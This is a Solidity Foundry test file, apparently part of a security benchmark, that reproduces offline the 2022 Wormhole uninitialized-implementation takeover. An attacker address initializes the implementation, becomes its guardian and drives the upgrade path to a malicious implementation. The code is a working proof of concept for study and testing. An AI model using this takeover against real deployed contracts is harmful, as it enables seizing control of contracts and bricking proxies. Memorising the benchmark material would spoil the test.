// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {WormholeCoreImpl} from
    "../fixtures/upgrade-governance/b-incident/WormholeUninitImplClone.sol";

/// @title upgrade-governance tier (b): Wormhole uninitialized-implementation takeover (2022-02-24).
/// @notice Minimized offline reproduction of the documented mechanism (whitehat satya0x, $10M
///         bounty): the UUPS implementation contract was left uninitialized, so anyone could
///         call `initialize()` on the implementation directly, become its guardian, and invoke
///         the guardian-only upgrade path (which in the incident delegatecalled a selfdestruct
///         that would brick the proxy). Mechanism-level: no attack tx exists (whitehat). The
///         selfdestruct consequence is abstracted to its takeover precondition. Verdict is
///         derived from the real outcome: an unauthorized guardian takeover. See PROVENANCE.md.
contract WormholeUninitIncidentTest is Test {
    address constant ATTACKER = address(0xBAD);
    address constant EVIL_IMPL = address(0xE11);

    function _report(string memory target, bool takenOver) internal pure {
        string memory verdict = takenOver ? "VULNERABLE" : "BLOCKED";
        console.log(string.concat("[upgrade-governance] target=", target, " verdict=", verdict));
    }

    function test_wormhole_uninitImpl_guardianTakeover() public {
        // The implementation contract, deployed but (as in the incident) left UNINITIALIZED.
        // A proxy would delegatecall it with the proxy's own storage holding the legit guardian;
        // the bug is that the implementation contract's OWN storage is never initialized.
        WormholeCoreImpl impl = new WormholeCoreImpl();
        assertFalse(impl.initialized(), "implementation left uninitialized (the bug precondition)");

        // ATTACK: anyone initializes the implementation directly and becomes its guardian.
        vm.prank(ATTACKER);
        impl.initialize(ATTACKER);

        // The attacker now wields the guardian-only upgrade path on the implementation - in the
        // incident this delegatecalled a selfdestruct migration that would brick the proxy.
        vm.prank(ATTACKER);
        impl.submitContractUpgrade(EVIL_IMPL);

        bool takenOver = (impl.guardian() == ATTACKER && impl.implementation() == EVIL_IMPL);
        _report("wormhole-uninit-impl-victim", takenOver);

        assertTrue(takenOver, "uninitialized implementation lets anyone seize guardian control");
        assertEq(impl.guardian(), ATTACKER, "attacker became the implementation's guardian");
        assertEq(impl.implementation(), EVIL_IMPL, "attacker drove the guardian-only upgrade path");
    }
}
